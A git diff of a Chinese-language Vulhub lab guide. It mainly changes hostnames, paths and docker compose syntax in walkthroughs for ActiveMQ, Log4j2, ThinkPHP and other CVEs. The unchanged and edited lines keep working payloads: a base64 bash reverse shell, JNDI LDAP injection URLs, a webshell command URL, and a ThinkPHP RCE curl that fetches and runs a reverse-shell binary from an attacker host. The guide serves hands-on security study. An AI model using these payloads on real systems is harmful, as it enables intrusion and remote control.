@@ -2,11 +2,10 @@
 
 ## 1. 安装
 
-下载
+克隆仓库
 
 ```
-┌──(root@debian)-[~]
-└─# git clone https://github.com/vulhub/vulhub.git /root/tools/apps/vulhub
+git clone https://github.com/vulhub/vulhub.git /root/tools/apps/vulhub
 ```
 
 ## 2. 使用
@@ -23,8 +22,8 @@
 ```
 ┌──(root@debian)-[~]
 └─# cd /root/tools/apps/vulhub/path \
-&& docker image build -t cont . || true \
-&& docker-compose up -d
+&& docker compose build \
+&& docker compose up -d
 ```
 
 查看文档
@@ -38,7 +37,7 @@
 
 ```
 ┌──(root@debian)-[~/…/apps/vulhub/path]
-└─# docker-compose down -v
+└─# docker compose down -v
 ```
 
 ### 2.1 activemq
@@ -50,7 +49,7 @@
 启动漏洞环境
 
 ```shell
-[root@centos ~]# docker-compose -f /root/tools/vulhub/activemq/CVE-2015-5254/docker-compose.yml build && docker-compose -f /root/tools/vulhub/activemq/CVE-2015-5254/docker-compose.yml up -d
+[root@centos ~]# docker-compose -f /root/tools/apps/vulhub/activemq/CVE-2015-5254/docker-compose.yml build && docker-compose -f /root/tools/vulhub/activemq/CVE-2015-5254/docker-compose.yml up -d
 ```
 
 访问
@@ -159,7 +158,7 @@ Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode)
 
 查看这个队列中所有消息
 
-> http://centos7-6.local:8161/admin/browse.jsp?JMSDestination=event
+> http://debian:8161/admin/browse.jsp?JMSDestination=event
 >
 > 用户名：    admin
 >
@@ -195,7 +194,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 访问
 
-> http://centos7-6.local:8161/
+> http://debian:8161/
 
 ![访问](./../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
 
@@ -242,7 +241,7 @@ Content-Length: 0
 
 **漏洞复现**
 
-访问 http://centos7-6.local:8161/fileserver/ 
+访问 http://debian:8161/fileserver/ 
 
 ![访问](./../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E8%AE%BF%E9%97%AE.png)
 
@@ -276,7 +275,7 @@ Content-Length: 450
 %>
 ```
 
-访问 http://centos7-6.local:8161/fileserver/test.txt ，确认文件 test.txt 已经上传
+访问 http://debian:8161/fileserver/test.txt ，确认文件 test.txt 已经上传
 
 ![确认文件 test.txt 已经上传](./../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E7%A1%AE%E8%AE%A4%E6%96%87%E4%BB%B6%20test.txt%20%E5%B7%B2%E7%BB%8F%E4%B8%8A%E4%BC%A0.png)
 
@@ -300,7 +299,7 @@ Content-Length: 0
 
 ```
 
-访问 `http://centos7-6.local:8161/api/test.jsp` ，确认文件 `test.jsp` 已经上传
+访问 `http://debian:8161/api/test.jsp` ，确认文件 `test.jsp` 已经上传
 
 > 用户名：	admin
 >
@@ -310,7 +309,7 @@ Content-Length: 0
 
 验证
 
-> 指令：`http://centos7-6.local:8161/api/test.jsp?pwd=023&i=[command]`
+> 指令：`http://debian:8161/api/test.jsp?pwd=023&i=[command]`
 
 ![验证](./../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E9%AA%8C%E8%AF%81.png)
 
@@ -355,7 +354,7 @@ Content-Length: 0
 
 **漏洞复现**
 
-访问 http://centos7-6.local:8161/fileserver/ ，抓包，上传 cron 配置文件
+访问 http://debian:8161/fileserver/ ，抓包，上传 cron 配置文件
 
 > 记得使用 n.py 更改换行符格式为 `\n`
 
@@ -437,7 +436,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 访问
 
-> http://centos7-6.local:8080/
+> http://debian:8080/
 
 ![访问](./../../../../images/Vulhub/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
 
@@ -498,7 +497,7 @@ drwx------ 4 root    root    4096 Apr  2  2020 tmp.m9QD2FWWw0
 
 获取评估许可证
 
-> https://my.atlassian.com/license/evaluation?product=Confluence&licensefieldname=confLicenseString&version=8.5.1&build=9012&sid=BPM2-Z0QS-YZQE-KCTZ&callback=http://centos7-6.local:8090/setup/setuplicense.action&ref=prod
+> https://my.atlassian.com/license/evaluation?product=Confluence&licensefieldname=confLicenseString&version=8.5.1&build=9012&sid=BPM2-Z0QS-YZQE-KCTZ&callback=http://debian:8090/setup/setuplicense.action&ref=prod
 
 Server ID:
 
@@ -654,7 +653,7 @@ WARNING: server returned more data than it should - server is vulnerable!
 切换到靶场目录
 
 ```
-[root@centos ~]# cd ~/vulhub/log4j/CVE-2021-44228/
+[root@centos ~]# cd ~/tools/apps/vulhub/log4j/CVE-2021-44228/
 ```
 
 启动环境
@@ -671,7 +670,7 @@ WARNING: server returned more data than it should - server is vulnerable!
 
 访问
 
-> http://centos7-6.local:8983/
+> http://debian:8983/
 
 **漏洞验证**
 
@@ -914,13 +913,13 @@ bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYuMjQvNDQ0NCAwPiYx}|{base64
 利用 log4j2 漏洞，构造恶意的 jndi 请求
 
 ```
-http://centos7-6.local:8983/solr/admin/cores?action=${jndi:ldap://kali.local:1389/lhumat}
+http://debian:8983/solr/admin/cores?action=${jndi:ldap://kali.local:1389/lhumat}
 ```
 
 对 ${ } 及其内容，进行 URL 编码
 
 ```
-http://centos7-6.local:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%3a%31%33%38%39%2f%6c%68%75%6d%61%74%7d
+http://debian:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%3a%31%33%38%39%2f%6c%68%75%6d%61%74%7d
 ```
 
 保留 LDAP 或 RMI 服务，创建侦听
@@ -934,7 +933,7 @@ http://centos7-6.local:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%
 
 ```
 ┌──(root㉿kali)-[~]
-└─# curl http://centos7-6.local:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%3a%31%33%38%39%2f%6c%68%75%6d%61%74%7d
+└─# curl http://debian:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%3a%31%33%38%39%2f%6c%68%75%6d%61%74%7d
 ```
 
 ![执行 payload](./../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%89%A7%E8%A1%8C%20payload.png)
@@ -1062,7 +1061,7 @@ services:
 
 访问
 
-> http://centos7-6.local:8080
+> http://debian:8080
 
 查看复现文档
 
@@ -1094,7 +1093,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 ```
 ┌──(root㉿kali)-[~]
-└─# curl http://centos7-6.local:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" |head -n 1
+└─# curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" |head -n 1
 ```
 
 ![使用 curl 命令访问漏洞链接，并执行命令](./../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%20curl%20%E5%91%BD%E4%BB%A4%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png)
@@ -1310,7 +1309,7 @@ msf6 exploit(multi/handler) > run
 编辑漏洞命令
 
 ```
-curl http://centos7-6.local:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl -so /tmp/reverse_tcp_shell http://kali.local/reverse_tcp_shell;chmod +x /tmp/reverse_tcp_shell;/tmp/reverse_tcp_shell;rm -f /tmp/reverse_tcp_shell"
+curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl -so /tmp/reverse_tcp_shell http://kali.local/reverse_tcp_shell;chmod +x /tmp/reverse_tcp_shell;/tmp/reverse_tcp_shell;rm -f /tmp/reverse_tcp_shell"
 ```
 
 用 BurpSuite 对漏洞进行 url 编码
@@ -1318,7 +1317,7 @@ curl http://centos7-6.local:8080/index.php?s=captcha -d "_method=__construct&fil
 ![用 BurpSuite 对漏洞进行 url 编码](./../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E7%94%A8%20BurpSuite%20%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%20url%20%E7%BC%96%E7%A0%81.png)
 
 ```
-curl http://centos7-6.local:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%63%75%72%6c%20%2d%73%6f%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%63%68%6d%6f%64%20%2b%78%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%72%6d%20%2d%66%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c"
+curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%63%75%72%6c%20%2d%73%6f%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%63%68%6d%6f%64%20%2b%78%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%72%6d%20%2d%66%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c"
 ```
 
 渗透成功
